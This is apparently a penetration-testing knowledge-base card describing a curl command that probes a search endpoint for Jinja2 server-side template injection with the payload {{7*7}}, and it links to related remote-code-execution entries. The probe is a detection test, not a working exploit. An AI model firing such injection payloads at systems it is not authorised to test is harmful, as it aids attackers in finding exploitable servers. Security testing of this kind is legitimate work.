---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: curl-test-ssti
type: command
executor: bash
data: 'curl -G "http://target.com/search" --data-urlencode "q={{7*7}}"'
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - web
  - testing
verified: true
validated: true
---

# curl-test-ssti

## Command

```bash
curl -G "http://target.com/search" --data-urlencode "q={{7*7}}"
```

## Description

This command tests for Server-Side Template Injection (SSTI) in a web application by injecting a basic Jinja2 expression into a URL parameter. Use it on potentially vulnerable endpoints like search forms to confirm if user input is rendered as a template.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -G | Treats subsequent data as GET parameters | Yes |
| --data-urlencode "q={{7*7}}" | Encodes the query parameter with SSTI test payload | Yes |
| "http://target.com/search" | Target endpoint URL (replace with actual) | Yes |

## Examples

### Basic Usage

```bash
curl -G "http://target.com/search" --data-urlencode "q={{7*7}}"
```

### Advanced Usage

For POST: Replace -G with -X POST -d "q={{7*7}}"

## Expected Output

If vulnerable, the response body contains "49" (result of 7*7). If not, it shows the literal "{{7*7}}" or an error.

## Related

- [[procedures/Jinja2-RCE-via-Server-Side-Template-Injection]]
- [[commands/curl-inject-jinja2-rce]]
